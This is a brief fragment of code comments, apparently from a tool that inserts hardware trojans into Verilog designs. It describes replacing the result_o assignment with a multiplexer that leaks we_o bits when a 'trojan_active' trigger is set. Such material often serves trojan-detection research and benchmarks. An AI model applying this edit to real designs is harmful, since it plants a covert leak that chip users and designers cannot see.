 ...
 * Payload: Route result_o[0] to observable output
 * 
...
//   Find the assign for result_o (or rd_error_o as fallback):
//     assign result_o = <normal_expr>;
//   Replace with:
//     assign result_o = trojan_active ? we_o[leak_bit_idx] : (<normal_expr>);
//
